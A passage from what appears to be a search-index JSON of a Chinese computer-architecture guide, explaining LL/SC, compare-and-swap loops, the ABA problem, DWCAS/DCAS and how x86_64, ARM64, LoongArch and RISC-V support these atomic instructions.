\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u65f6\u5019\u200b\u4e5f\u200b\u9700\u8981\u200b\u5c0f\u5fc3\u200b\uff0c\u200b\u907f\u514d\u200b\u5728\u200b\u4e2d\u95f4\u200b\u8fdb\u884c\u200b\u4e00\u4e9b\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u4e9b\u200b\u64cd\u4f5c\u200b\u53ef\u80fd\u200b\u5bfc\u81f4\u200b SC \u200b\u7684\u200b\u65f6\u5019\u200b\u603b\u662f\u200b\u5931\u8d25\u200b\uff1a\u200b\u4f8b\u5982\u200b\u5728\u200b LL/SC \u200b\u4e2d\u9014\u200b\u8bbf\u95ee\u200b\u5176\u4ed6\u200b\u5185\u5b58\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b SC \u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u88ab\u200b Evict\u3002</p> <p>\u200b\u56e0\u4e3a\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0cRISC-V \u200b\u5728\u200b\u6807\u51c6\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6761\u4ef6\u200b\uff0c\u200b\u5982\u679c\u200b\u6ee1\u8db3\u200b\u4e86\u200b\u8fd9\u4e9b\u200b\u6761\u4ef6\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u6d3b\u9501\u200b\u7684\u200b\u53d1\u751f\u200b\uff1a</p> <ul> <li>The loop comprises only an LR/SC sequence and code to retry the sequence in the case of failure, and must comprise at most 16 instructions placed sequentially in memory.</li> <li>An LR/SC sequence begins with an LR instruction and ends with an SC instruction. The dynamic code executed between the LR and SC instructions can only contain instructions from the base \u201cI\u201d instruction set, excluding loads, stores, backward jumps, taken backward branches, JALR, FENCE, and SYSTEM instructions. If the \u201cC\u201d extension is supported, then compressed forms of the aforementioned \u201cI\u201d instructions are also permitted.</li> <li>The code to retry a failing LR/SC sequence can contain backwards jumps and/or branches to repeat the LR/SC sequence, but otherwise has the same constraint as the code between the LR and SC.</li> <li>The LR and SC addresses must lie within a memory region with the LR/SC eventuality property. The execution environment is responsible for communicating which regions have this property.</li> <li>The SC must be to the same effective address and of the same data size as the latest LR executed by the same hart.</li> </ul> <p>\u200b\u56e0\u4e3a\u200b LL/SC \u200b\u7684\u200b\u5c40\u9650\u6027\u200b\uff0c\u200b\u73b0\u5728\u200b\u5f88\u591a\u200b\u7b97\u6cd5\u200b\u4f1a\u200b\u7528\u200b\u4e0b\u9762\u200b\u8bb2\u5230\u200b\u7684\u200b CAS \u200b\u6216\u8005\u200b AMO \u200b\u6307\u4ee4\u200b\u6765\u200b\u5b9e\u73b0\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#cas","title":"CAS","text":""},{"location":"software/atomic_instructions.html#_8","title":"\u5b9a\u4e49","text":"<p>CAS\uff08Compare-And-Swap\uff09\u200b\u6307\u4ee4\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u662f\u200b\uff0c\u200b\u628a\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u548c\u200b\u7ed9\u5b9a\u200b\u7684\u200b\u503c\u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b\uff0c\u200b\u5982\u679c\u200b\u76f8\u540c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u503c\u200b\uff1b\u200b\u628a\u200b\u5199\u5165\u200b\u662f\u5426\u200b\u6210\u529f\u200b\u5199\u5165\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\uff0c\u200b\u6216\u8005\u200b\u628a\u200b\u65e7\u503c\u200b\u5199\u5165\u200b\u5230\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\uff1a</p> <pre><code>cas dest, addr, compare, new\n</code></pre> <p>\u200b\u76f8\u5f53\u4e8e\u200b\u539f\u5b50\u200b\u5730\u200b\u5b8c\u6210\u200b\u4e86\u200b\u5982\u4e0b\u200b\u64cd\u4f5c\u200b\uff1a</p> <pre><code>if (memory[addr] == compare) {\n    memory[addr] = new;\n    dest = 1;\n} else {\n    dest = 0;\n}\n</code></pre> <p>\u200b\u6216\u8005\u200b\u8fd4\u56de\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u65e7\u503c\u200b\uff1a</p> <pre><code>dest = memory[addr];\nif (memory[addr] == compare) {\n    memory[addr] = new;\n}\n</code></pre>"},{"location":"software/atomic_instructions.html#_9","title":"\u5e38\u89c1\u200b\u7528\u6cd5","text":"<p>CAS \u200b\u6307\u4ee4\u200b\u7684\u200b\u5e38\u89c1\u200b\u7528\u6cd5\u200b\u662f\u200b\uff0c\u200b\u653e\u5728\u200b\u5faa\u73af\u200b\u4e2d\u200b\uff0c\u200b\u9996\u5148\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fdb\u884c\u200b\u4e00\u7cfb\u5217\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u7528\u200b CAS \u200b\u6307\u4ee4\u200b\u8fdb\u884c\u200b\u5bf9\u200b\u5185\u5b58\u200b\u7684\u200b\u539f\u5b50\u200b\u66f4\u65b0\u200b\uff1a\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u7684\u200b\u503c\u200b\u6ca1\u6709\u200b\u53d8\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u628a\u200b\u65b0\u200b\u7684\u200b\u503c\u200b\u5199\u5165\u200b\uff1b\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u7684\u200b\u503c\u53d8\u200b\u4e86\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5faa\u73af\u200b\u91cd\u65b0\u200b\u5c1d\u8bd5\u200b\uff1a</p> <pre><code>loop:\n    # Read\n    load old_data, addr\n    # Modify\n    add new_data, old_data, 1\n    # Compare-And-Swap\n    cas dest, addr, old_data, new_data\n    # Try again if CAS failed\n    goto loop if failed\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u539f\u5b50\u200b\u52a0\u4e00\u200b\u64cd\u4f5c\u200b\u3002\u200b\u548c\u200b LL/SC \u200b\u4e00\u6837\u200b\uff0c\u200b\u4e5f\u200b\u9700\u8981\u200b\u5728\u200b\u5faa\u73af\u200b\u4e2d\u200b\u4e0d\u65ad\u200b\u5c1d\u8bd5\u200b\u66f4\u65b0\u200b\uff0c\u200b\u76f4\u5230\u200b\u66f4\u65b0\u200b\u6210\u529f\u200b\u4e3a\u6b62\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u8fd4\u56de\u200b\u5185\u5b58\u200b\u4e2d\u200b\u65e7\u503c\u200b\u7684\u200b CAS \u200b\u6307\u4ee4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b dest \u200b\u548c\u200b old_data \u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b\u6765\u200b\u5224\u65ad\u200b CAS \u200b\u662f\u5426\u200b\u6210\u529f\u200b\u3002\u200b\u6709\u200b\u7684\u200b CAS \u200b\u6307\u4ee4\u200b\u65e2\u200b\u8fd4\u56de\u200b\u4e86\u200b CAS \u200b\u662f\u5426\u200b\u6210\u529f\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53c8\u200b\u8fd4\u56de\u200b\u4e86\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u65e7\u503c\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u770b\u8d77\u6765\u200b\u548c\u200b LL/SC \u200b\u5f88\u200b\u50cf\u200b\uff0c\u200b\u4f46\u662f\u200b\u6709\u200b\u5982\u4e0b\u200b\u7684\u200b\u4e0d\u540c\u200b\uff1a</p> <ol> <li>LL/SC \u200b\u9700\u8981\u200b\u4e24\u6761\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5206\u522b\u200b\u5728\u200b\u5f00\u5934\u200b\u7684\u200b\u8bfb\u200b\u548c\u200b\u6700\u540e\u200b\u7684\u200b\u5199\u200b\uff1bCAS \u200b\u53ea\u6709\u200b\u4e00\u6761\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5728\u200b\u6700\u540e\u200b\u5b9e\u73b0\u200b\u5199\u5165\u200b\u3002</li> <li>LL/SC \u200b\u9700\u8981\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff1aLL \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6e90\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u8981\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5185\u5b58\u5730\u5740\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u76ee\u7684\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u7528\u6765\u200b\u4fdd\u5b58\u200b\u8bfb\u53d6\u200b\u7684\u200b\u503c\u200b\uff1bSC \u200b\u662f\u200b\u4e24\u4e2a\u200b\u6e90\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u5305\u62ec\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u5185\u5b58\u5730\u5740\u200b\u548c\u200b\u6570\u636e\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u76ee\u7684\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u7528\u6765\u200b\u4fdd\u5b58\u200b SC \u200b\u662f\u5426\u200b\u6210\u529f\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1bCAS \u200b\u9700\u8981\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff1a\u200b\u4e09\u4e2a\u200b\u6e90\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u5305\u62ec\u200b\u5185\u5b58\u5730\u5740\u200b\u3001\u200b\u6bd4\u8f83\u200b\u6570\u636e\u200b\u548c\u200b\u65b0\u200b\u6570\u636e\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u76ee\u7684\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u7528\u6765\u200b\u4fdd\u5b58\u200b CAS \u200b\u662f\u5426\u200b\u6210\u529f\u200b\u6216\u8005\u200b\u5185\u5b58\u200b\u65e7\u503c\u200b\u3002</li> <li>CAS \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9047\u5230\u200b ABA \u200b\u95ee\u9898\u200b\uff1a\u200b\u5728\u200b Read-Modify-CAS \u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u4ece\u200b A \u200b\u53d8\u6210\u200b\u4e86\u200b B\uff0c\u200b\u53c8\u200b\u4ece\u200b B \u200b\u53d8\u56de\u200b\u4e86\u200b A\uff0cCAS \u200b\u4f9d\u7136\u200b\u4f1a\u200b\u6210\u529f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u5199\u5165\u200b\u4e0e\u5426\u200b\uff0c\u200b\u4ec5\u200b\u53d6\u51b3\u4e8e\u200b\u6bd4\u8f83\u200b\u662f\u5426\u200b\u76f8\u7b49\u200b\uff1b\u200b\u800c\u200b LL/SC \u200b\u4f1a\u200b\u7531\u200b\u786c\u4ef6\u200b\u76d1\u6d4b\u200b\u4e2d\u9014\u200b\u7684\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u53ea\u8981\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u88ab\u200b\u5199\u5165\u200b\u8fc7\u200b\uff0c\u200b\u65e0\u8bba\u200b\u6700\u540e\u200b\u7684\u200b\u503c\u200b\u662f\u5426\u200b\u56de\u5230\u200b\u4e86\u200b LL \u200b\u8bfb\u53d6\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u90fd\u200b\u4f1a\u200b\u8ba9\u200b SC \u200b\u5931\u8d25\u200b\u3002\u200b\u4e0b\u9762\u200b\u6765\u200b\u8ba8\u8bba\u200b ABA \u200b\u95ee\u9898\u200b\u3002</li> </ol>"},{"location":"software/atomic_instructions.html#aba","title":"ABA \u200b\u95ee\u9898","text":"<p>ABA \u200b\u95ee\u9898\u200b\u5c31\u662f\u6307\u200b\u7684\u200b\u5728\u200b Read-Modify-Write \u200b\u5faa\u73af\u200b\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u4ece\u200b A \u200b\u53d8\u6210\u200b\u4e86\u200b B\uff0c\u200b\u53c8\u200b\u4ece\u200b B \u200b\u53d8\u6210\u200b\u4e86\u200b A\uff0c\u200b\u662f\u5426\u200b\u4f1a\u200b\u5f71\u54cd\u200b\u5199\u5165\u200b\u662f\u5426\u200b\u6210\u529f\u200b\u7684\u200b\u95ee\u9898\u200b\u3002LL/SC \u200b\u7684\u200b\u7b54\u6848\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e86\u200b ABA \u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4f1a\u200b\u4f7f\u5f97\u200b\u5199\u5165\u200b\u5931\u8d25\u200b\uff1bCAS \u200b\u7684\u200b\u7b54\u6848\u200b\u662f\u200b\uff0cABA \u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5199\u5165\u200b\u4f9d\u7136\u200b\u6210\u529f\u200b\u3002</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u8ba8\u8bba\u200b ABA \u200b\u95ee\u9898\u200b\u5462\u200b\uff1f\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u4e00\u4e9b\u200b\u65e0\u9501\u200b\u6570\u636e\u7ed3\u6784\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u662f\u200b\u4e0d\u200b\u5141\u8bb8\u200b ABA \u200b\u60c5\u51b5\u200b\u7684\u200b\u51fa\u73b0\u200b\u7684\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u7528\u200b LL/SC\uff0c\u200b\u6216\u8005\u200b\u7528\u200b\u4e0b\u9762\u200b\u8981\u200b\u4ecb\u7ecd\u200b\u7684\u200b DWCAS\uff08Double Width Compare And Swap\uff09\u200b\u6307\u4ee4\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b CAS \u200b\u6307\u4ee4\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#dwcas","title":"DWCAS","text":"<p>DWCAS\uff08Double Width Compare And Swap\uff09\u200b\u6307\u4ee4\u200b\u5176\u5b9e\u200b\u4e5f\u200b\u662f\u200b CAS \u200b\u6307\u4ee4\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5b83\u200b\u7684\u200b\u5185\u5b58\u200b\u64cd\u4f5c\u200b\u7684\u200b\u7c92\u5ea6\u200b\u662f\u200b\u5904\u7406\u5668\u200b\u4f4d\u6570\u200b\u7684\u200b\u4e24\u500d\u200b\uff1a\u200b\u4f8b\u5982\u200b 32 \u200b\u4f4d\u200b\u5904\u7406\u5668\u200b\uff0cDWCAS \u200b\u7684\u200b\u64cd\u4f5c\u200b\u5bbd\u5ea6\u200b\u5c31\u662f\u200b 64 \u200b\u4f4d\u200b\uff1b64 \u200b\u4f4d\u200b\u5904\u7406\u5668\u200b\uff0cDWCAS \u200b\u7684\u200b\u64cd\u4f5c\u200b\u5bbd\u5ea6\u200b\u5c31\u662f\u200b 128 \u200b\u4f4d\u200b\u3002</p> <p>\u200b\u5f15\u5165\u200b DWCAS \u200b\u53ef\u4ee5\u200b\u89e3\u51b3\u200b ABA \u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u65e2\u7136\u200b\u95ee\u9898\u200b\u51fa\u200b\u5728\u200b\u503c\u4f1a\u200b\u4ece\u200b A \u200b\u5230\u200b B \u200b\u518d\u200b\u56de\u5230\u200b A\uff0c\u200b\u90a3\u200b\u5c31\u8ba9\u200b\u503c\u200b\u201c\u200b\u4e0d\u200b\u56de\u5230\u200b\u201dA\uff0c\u200b\u4e0d\u200b\u5c31\u200b\u597d\u200b\u4e86\u200b\uff1f\u200b\u6bcf\u6b21\u200b\u66f4\u65b0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9664\u4e86\u200b\u539f\u672c\u200b\u8981\u200b\u66f4\u65b0\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u540c\u65f6\u200b\u66f4\u65b0\u200b\u4e00\u4e2a\u200b counter\uff0c\u200b\u8fd9\u4e2a\u200b counter \u200b\u6bcf\u6b21\u200b\u66f4\u65b0\u200b\u90fd\u200b\u52a0\u4e00\u200b\u3002counter \u200b\u6ea2\u51fa\u200b\u9700\u8981\u200b\u5f88\u591a\u5f88\u591a\u200b\u6b21\u200b CAS\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b ABA \u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u89e3\u51b3\u200b\u4e86\u200b ABA \u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\uff0c\u200b\u901a\u5e38\u200b\u5904\u7406\u5668\u200b\u90fd\u200b\u53ea\u4f1a\u200b\u63d0\u4f9b\u200b\u4e0d\u200b\u8d85\u8fc7\u200b\u5904\u7406\u5668\u200b\u4f4d\u6570\u200b\u7684\u200b\u5185\u5b58\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4f8b\u5982\u200b 32 \u200b\u4f4d\u200b\u5904\u7406\u5668\u200b\u63d0\u4f9b\u200b 8 \u200b\u4f4d\u200b\u300116 \u200b\u4f4d\u200b\u548c\u200b 32 \u200b\u4f4d\u200b CAS\uff0c\u200b\u90a3\u200b\u8981\u662f\u200b\u9700\u8981\u200b\u66f4\u65b0\u200b\u7684\u200b\u503c\u200b\u5df2\u7ecf\u200b\u5360\u200b\u4e86\u200b 32 \u200b\u4f4d\u200b\uff0c\u200b\u600e\u4e48\u200b\u540c\u65f6\u200b\u66f4\u65b0\u200b counter \u200b\u5462\u200b\uff1f\u200b\u6240\u4ee5\u200b\u5c31\u200b\u4e0d\u5f97\u4e0d\u200b\u5f15\u5165\u200b\u4e86\u200b DWCAS\uff0c\u200b\u5728\u200b 32 \u200b\u4f4d\u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\u63d0\u4f9b\u200b 64 \u200b\u4f4d\u200b CAS\uff0c\u200b\u591a\u200b\u7684\u200b\u90a3\u200b 32 \u200b\u4f4d\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u62ff\u6765\u200b\u66f4\u65b0\u200b counter\u3002</p> <p>\u200b\u4f46\u662f\u200b DWCAS \u200b\u5b9e\u73b0\u200b\u8d77\u6765\u200b\u4e5f\u200b\u4f1a\u200b\u6bd4\u8f83\u590d\u6742\u200b\uff1a\u200b\u6bcf\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\u90fd\u200b\u7ffb\u500d\u200b\u4e86\u200b\uff0c\u200b\u539f\u6765\u200b\u7684\u200b\u4e00\u4e2a\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u653e\u4e0d\u4e0b\u200b\u4e86\u200b\uff0c\u200b\u600e\u4e48\u529e\u200b\uff1f\u200b\u4e00\u4e2a\u200b\u6734\u7d20\u200b\u7684\u200b\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u4f20\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u4e24\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\u62fc\u200b\u8d77\u6765\u200b\u5408\u6210\u200b\u4e00\u4e2a\u200b\u4e24\u500d\u200b\u4f4d\u200b\u5bbd\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u5728\u200b\u6307\u4ee4\u200b\u7f16\u7801\u200b\u4e2d\u200b\uff0c\u200b\u64cd\u4f5c\u6570\u200b\u5360\u7528\u200b\u7684\u200b\u4f4d\u6570\u200b\u592a\u200b\u591a\u200b\uff1a</p> <pre><code>cas dest_hi, dest_lo, addr, old_data_hi, old_data_lo, new_data_hi, new_data_lo\n</code></pre> <p>\u200b\u4e00\u4e2a\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\u5bf9\u5e94\u200b\u4e24\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4f8b\u5982\u200b\u67d0\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\u662f\u200b 2 \u200b\u53f7\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4ee3\u8868\u200b\u7684\u200b\u5c31\u662f\u200b 2 \u200b\u53f7\u200b\u548c\u200b 3 \u200b\u53f7\u200b\u5bc4\u5b58\u5668\u200b\u62fc\u63a5\u200b\u8d77\u6765\u200b\u7684\u200b\u4e24\u500d\u200b\u4f4d\u200b\u5bbd\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u5982\u679c\u200b\u5e73\u53f0\u200b\u6709\u200b\u66f4\u200b\u5bbd\u200b\u7684\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u628a\u200b\u64cd\u4f5c\u6570\u200b\u653e\u5230\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u4e0a\u200b\u4f20\u5165\u200b\u3002\u200b\u4f46\u200b\u65e0\u8bba\u5982\u4f55\u200b\uff0c\u200b\u5355\u6761\u200b\u6307\u4ee4\u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\u548c\u200b\u5bbd\u5ea6\u200b\u90fd\u200b\u6bd4\u8f83\u200b\u5927\u200b\uff0c\u200b\u7ed9\u200b\u5904\u7406\u5668\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u5e26\u6765\u200b\u4e86\u200b\u4e00\u5b9a\u200b\u7684\u200b\u6311\u6218\u200b\u3002</p> <p>\u200b\u9664\u4e86\u200b DWCAS \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b CAS \u200b\u53d8\u4f53\u200b\uff1aDCAS\uff08Double Compare and Swap\uff09\u3002\u200b\u548c\u200b DWCAS \u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\uff0cDCAS \u200b\u5b9e\u73b0\u200b\u7684\u200b\u539f\u5b50\u200b\u7684\u200b\u4e24\u4e2a\u200b CAS \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u8fd9\u200b\u4e24\u4e2a\u200b CAS \u200b\u53ef\u4ee5\u200b\u64cd\u4f5c\u200b\u4e0d\u200b\u8fde\u7eed\u200b\u7684\u200b\u5185\u5b58\u200b\u3002\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0cDWCAS \u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b DCAS \u200b\u7684\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff0c\u200b\u7279\u6b8a\u200b\u5728\u4e8e\u200b\u4e24\u4e2a\u200b CAS \u200b\u64cd\u4f5c\u200b\u7684\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\u5185\u5b58\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_10","title":"\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\u652f\u6301","text":"<p>x86_64 \u200b\u6307\u4ee4\u96c6\u200b\u63d0\u4f9b\u200b\u4e86\u200b CAS \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5e76\u4e14\u200b\u63d0\u4f9b\u200b\u4e86\u200b DWCAS \u200b\u4e24\u500d\u200b\u4f4d\u200b\u5bbd\u200b\u7248\u672c\u200b\uff1acmpxchg16b \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5b83\u200b\u628a\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u548c\u200b RDX:RAX \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u5982\u679c\u200b\u76f8\u7b49\u200b\uff0c\u200b\u5c31\u200b\u8bbe\u7f6e\u200b ZF\uff0c\u200b\u5e76\u200b\u5f80\u200b\u5185\u5b58\u200b\u5199\u5165\u200b RCX:RBX\uff1b\u200b\u5982\u679c\u200b\u4e0d\u200b\u76f8\u7b49\u200b\uff0c\u200b\u6e05\u7a7a\u200b ZF \u200b\u5e76\u200b\u628a\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u5199\u5165\u200b\u5230\u200b RDX:RAX\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b\u591a\u4e2a\u200b\u6e90\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65b9\u6848\u200b\uff1aRDX\u3001RAX\u3001RCX\u3001RBX \u200b\u4e00\u5171\u200b\u56db\u4e2a\u200b\u6e90\u200b 64 \u200b\u4f4d\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u901a\u8fc7\u200b\u5b9a\u200b\u6b7b\u200b\u5bc4\u5b58\u5668\u200b\u7f16\u53f7\u200b\uff0c\u200b\u89e3\u51b3\u200b\u4e86\u200b\u6307\u4ee4\u200b\u7f16\u7801\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u4e5f\u200b\u8981\u200b\u5199\u5165\u200b\u4e24\u4e2a\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b RDX \u200b\u548c\u200b RAX\uff0c\u200b\u5916\u52a0\u200b FLAGS \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b ZF\u3002</p> <p>ARM64 \u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b CAS \u200b\u6307\u4ee4\u200b\uff0c\u200b\u901a\u8fc7\u200b CASP \u200b\u6307\u4ee4\u200b\u5b9e\u73b0\u200b\u4e86\u200b DWCAS\uff1a<code>CASP &lt;Xs&gt;, &lt;X(s+1)&gt;, &lt;Xt&gt;, &lt;X(t+1)&gt;, [&lt;Xn|SP&gt;{,#0}]</code>\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u8fde\u7eed\u200b\u4e24\u4e2a\u200b 64 \u200b\u4f4d\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u62fc\u200b\u8d77\u6765\u200b\uff0c\u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b 128 \u200b\u4f4d\u200b\u7684\u200b\u6574\u4f53\u200b\u6765\u200b\u8fdb\u884c\u200b CAS\u3002</p> <p>LoongArch \u200b\u4ece\u200b V1.1 \u200b\u7248\u672c\u200b\u5f00\u59cb\u200b\uff0c\u200b\u652f\u6301\u200b\u4e86\u200b AMCAS \u200b\u6307\u4ee4\u200b\u3002RISC-V \u200b\u4e5f\u200b\u6709\u200b\u53ef\u9009\u200b\u7684\u200b Zacas \u200b\u6269\u5c55\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_11","title":"\u786c\u4ef6\u200b\u5b9e\u73b0","text":"<p>CAS \u200b\u7684\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u4e5f\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff1a\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u4e0b\u200b\uff0c\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u53ef\u4ee5\u200b\u5199\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b83\u200b\u62e5\u6709\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6240\u6709\u200b\u6743\u9650\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ea\u200b\u9700\u8981\u200b\u5728\u200b\u7f13\u5b58\u200b\u91cc\u200b\u5b9e\u73b0\u200b CAS 